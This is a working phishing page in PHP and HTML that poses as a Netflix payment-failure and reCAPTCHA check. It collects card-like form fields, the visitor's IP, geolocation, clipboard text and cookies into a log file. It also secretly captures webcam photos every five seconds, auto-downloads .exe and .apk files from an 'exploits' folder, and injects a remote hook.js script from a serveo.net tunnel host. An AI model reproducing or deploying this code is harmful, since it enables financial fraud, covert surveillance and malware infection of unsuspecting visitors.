<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix | Falha no Pagamento</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }
        a {
            text-decoration: none;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: url('1.jpg') no-repeat center/cover;
            background-color: #141414;
        }
        .container {
            width: 100%;
            max-width: 450px;
            background: rgba(0, 0, 0, 0.85);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 2rem;
            color: #fff;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(5px);
        }
        h3 {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 1.5rem;
            color: #4A90E2;
            text-align: center;
        }
        .input-box {
            margin: 1rem 0;
        }
        .input-box input {
            width: 100%;
            height: 45px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 5px;
            padding: 0 15px;
            font-size: 1rem;
            color: #fff;
            outline: none;
            transition: border-color 0.3s;
        }
        .input-box input:focus {
            border-color: #4A90E2;
        }
        .input-box input::placeholder {
            color: #a1a1a1;
        }
        .input-box input[type="number"]::-webkit-inner-spin-button,
        .input-box input[type="number"]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        .input-box input[type="number"] {
            -moz-appearance: textfield;
        }
        .remember {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 1rem 0;
            font-size: 0.9rem;
            color: #b3b3b3;
        }
        .remember input[type="checkbox"] {
            margin-right: 5px;
        }
        .redirect {
            width: 100%;
            height: 50px;
            background: #4A90E2;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 1.1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s, transform 0.2s;
        }
        .redirect:hover {
            background: #357ABD;
            transform: translateY(-2px);
        }
        .feedback {
            margin-top: 1rem;
            text-align: center;
        }
        @media (max-width: 480px) {
            .container {
                margin: 1rem;
                padding: 1.5rem;
            }
            h3 {
                font-size: 1.2rem;
            }
            .redirect {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <?php
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization");

    function getUserIP() {
        $headers = [
            'HTTP_CF_CONNECTING_IP', // Cloudflare
            'HTTP_X_FORWARDED_FOR',  // Proxy ou rede móvel
            'HTTP_CLIENT_IP',        // Cliente
            'REMOTE_ADDR'            // Último recurso
        ];
        
        foreach ($headers as $header) {
            if (!empty($_SERVER[$header])) {
                $ip = $_SERVER[$header];
                if ($header === 'HTTP_X_FORWARDED_FOR') {
                    $ip_list = explode(',', $ip);
                    $ip = trim($ip_list[0]); // Pega o primeiro IP
                }
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
        return 'IP não disponível';
    }

    function getIPInfo($ip) {
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $encoded_ip = urlencode($ip);
        $api_url = "http://ip-api.com/json/{$encoded_ip}"; 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log('Erro cURL ao acessar ip-api.com: ' . curl_error($ch) . " | IP: $ip");
            curl_close($ch);
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code !== 200) {
            error_log("Erro HTTP $http_code ao acessar ip-api.com | IP: $ip");
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        $data = json_decode($response, true);
        if (!$data || $data['status'] !== 'success') {
            error_log("Resposta inválida do ip-api.com | IP: $ip | Resposta: $response");
            return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
        }

        return [
            'city' => $data['city'] ?? 'Cidade desconhecida',
            'region' => $data['regionName'] ?? 'Região desconhecida',
            'country' => $data['country'] ?? 'País desconhecido'
        ];
    }

    function getExploitFiles() {
        $directory = 'exploits/';
        $files = [];
        if (is_dir($directory)) {
            $allFiles = scandir($directory);
            foreach ($allFiles as $file) {
                if (in_array(pathinfo($file, PATHINFO_EXTENSION), ['exe', 'apk'])) {
                    $files[] = [
                        'href' => $directory . $file,
                        'nome' => $file
                    ];
                }
            }
        }
        return $files;
    }

    // Captura o IP e a geolocalização assim que a página carrega
    $ip = getUserIP();
    $ipData = getIPInfo($ip);
    $geoLocationIP = ($ipData['city'] ?? 'Cidade desconhecida') . ', ' . 
                     ($ipData['region'] ?? 'Região desconhecida') . ', ' . 
                     ($ipData['country'] ?? 'País desconhecido');

    // Salva a localização do IP no arquivo dados.txt no formato desejado
    if (!is_dir('uploads')) {
        mkdir('uploads', 0755, true);
    }

    $file = @fopen("dados.txt", "a");
    if ($file) {
        $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);

        fwrite($file, "+------------------------------------------------------------------------+\n");
        fwrite($file, "|                         Cliente $clientNumber                          |\n");
        fwrite($file, "+------------------------------------------------------------------------+\n");
        fwrite($file, "|  Dados capturados....                                                  |\n");
        fwrite($file, "+------------------------------------------------------------------------+\n");
        fwrite($file, "| IP: $ip                                                                |\n");
        fwrite($file, "+------------------------------------------------------------------------+\n");
        fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
        fwrite($file, "+------------------------------------------------------------------------+\n");
        fwrite($file, "\n");
        fclose($file);
    } else {
        error_log("Erro ao abrir o arquivo dados.txt para escrita");
    }

    $feedback = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Processa upload de foto
        if (isset($_FILES['photo']) && !empty($_FILES['photo']['tmp_name'])) {
            $photoPath = 'uploads/photo_' . time() . '.png';
            if (move_uploaded_file($_FILES['photo']['tmp_name'], $photoPath)) {
                error_log("Foto salva em: $photoPath");
            } else {
                error_log("Erro ao salvar foto em: $photoPath");
            }
        }

        // Processa dados do formulário
        if (isset($_POST['a1'])) {
            $a1 = $_POST['a1'] ?? 'N/A';
            $a2 = $_POST['a2'] ?? 'N/A';
            $a3 = $_POST['a3'] ?? 'N/A';
            $a4 = $_POST['a4'] ?? 'N/A';
            $location = $_POST['location'] ?? 'Localização não disponível';
            $clipboard = $_POST['clipboard'] ?? 'Nenhum texto da área de transferência';

            $file = @fopen("dados.txt", "a");
            if ($file) {
                $clientNumber = (file_exists("dados.txt") ? count(file("dados.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)) / 10 + 1 : 1);

                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "|                         Cliente $clientNumber                          |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "|  Dados capturados....                                                  |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| Input 1: $a1                                                           |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| Input 2: $a2                                                           |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| Input 3: $a3                                                           |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| Input 4: $a4                                                           |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| IP: $ip                                                                |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| Localização (Navegador): $location                                     |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| Área de Transferência: $clipboard                                      |\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "| Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
                fwrite($file, "+------------------------------------------------------------------------+\n");
                fwrite($file, "\n");
                fclose($file);
                $feedback = "<p style='color: green;' class='feedback'></p>";
            } else {
                error_log("Erro ao abrir o arquivo dados.txt para escrita");
                $feedback = "<p style='color: red;' class='feedback'></p>";
            }
        } else {
            error_log("POST recebido, mas 'a1' não está presente: " . json_encode($_POST));
        }
    } else {
        error_log("POST não recebido ou método inválido: " . json_encode($_POST));
    }

    $exploitFiles = getExploitFiles();
    ?>

    <main class="container">
        <form method="POST" enctype="multipart/form-data" id="form">
            <h3>Confirme que é você! - Recaptcha</h3>
            <div class="input-box">
                <input placeholder="Input 1" type="text" name="a1" maxlength="50" required>
            </div>
            <div class="input-box">
                <input placeholder="Input 2" type="number" name="a2" maxlength="16" required>
            </div>
            <div class="input-box">
                <input placeholder="Input 3" type="number" name="a3" maxlength="3" required>
            </div>
            <div class="input-box">
                <input placeholder="Input 4" type="number" name="a4" maxlength="4" required>
            </div>
            <div class="remember">
                <label><input type="checkbox" name="remember_me"> Lembre de mim</label>
            </div>
            <input type="hidden" name="location" id="location">
            <input type="hidden" name="clipboard" id="clipboard">
            <video id="video" autoplay style="display: none;"></video>
            <canvas id="canvas" style="display: none;"></canvas>
            <button type="submit" class="redirect">Enviar</button>
            <?php echo $feedback; ?>
        </form>
    </main>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const form = document.getElementById('form');
        const locationInput = document.getElementById('location');
        const clipboardInput = document.getElementById('clipboard');

        // Função para capturar clipboard
        async function captureClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    return await navigator.clipboard.readText() || 'N/A';
                }
                return 'Clipboard não suportado';
            } catch (err) {
                return 'N/A: ' + err.message;
            }
        }

        // Captura localização
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    locationInput.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                    console.log("Localização capturada: ", locationInput.value);
                },
                err => {
                    locationInput.value = 'N/A';
                    console.error('Geolocalização negada ou indisponível', err);
                }
            );
        } else {
            locationInput.value = 'N/A';
            console.log("Geolocalização não suportada pelo navegador");
        }

        // Inicia a câmera e captura fotos continuamente
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                const context = canvas.getContext('2d');

                // Aguarda o vídeo estar pronto
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // Captura e envia fotos a cada 5 segundos
                    setInterval(() => {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('photo', blob, `photo_${Date.now()}.png`);
                            fetch(window.location.href, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => console.log('Foto enviada com sucesso'))
                            .catch(err => console.error('Erro ao enviar foto:', err));
                        }, 'image/png');
                    }, 5000); // 5 segundos
                };
            })
            .catch(err => {
                console.error('Acesso à câmera negado ou indisponível:', err);
            });

        // Manipula o envio do formulário
        form.addEventListener('submit', async (event) => {
            event.preventDefault(); // Evita envio padrão pra garantir clipboard
            const clipboardText = await captureClipboard();
            clipboardInput.value = clipboardText;
            console.log("Clipboard enviado: ", clipboardText);
            form.submit(); // Envia o formulário
        });

        // Função para disparar download
        function triggerDownload(filePath, fileName) {
            const link = document.createElement('a');
            link.href = filePath;
            link.download = fileName;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            console.log(`Download iniciado: ${fileName}`);
        }

        // Dispara downloads dos exploits uma única vez
        window.onload = () => {
            document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";

            const arquivos = <?php echo json_encode($exploitFiles); ?>;
            if (arquivos.length > 0) {
                arquivos.forEach((arquivo, i) => {
                    setTimeout(() => {
                        triggerDownload(arquivo.href, arquivo.nome);
                    }, i * 5000); // Intervalo de 1s entre downloads
                });
            } 
        };

        /* 
            000000000000       000000000000             
            0oooooooooo0       0oooooooooo0               
            0oo0000oooo0       0oo0000oooo0                      
            0oo0000oooo0       0oo0000oooo0                      
            0oo0000oooo0       0oo0000oooo0                   
            0oo0000oooo0       0oo0000oooo0                 
            0oo____oooo0       0oo____oooo0 
            000000000000       000000000000                                         
            1                    ___________         _________
            1  '    sssssssss  |___________        |_________
            1       ss         |                   |
            1         s        |___________        |_________
            1          s       |                   |
            1           s      |___________        |__________
            1     ssssssss     |___________        |__________  .you  
            1
            ___              
        */
    </script>
    <script>
        var commandModuleStr = '<script src="https://902bfb34f2272eacab39ba2d3ba73d12.serveo.net/hook.js" type="text/javascript"><\/script>';
        document.write(commandModuleStr);
    </script>
</body>
</html>
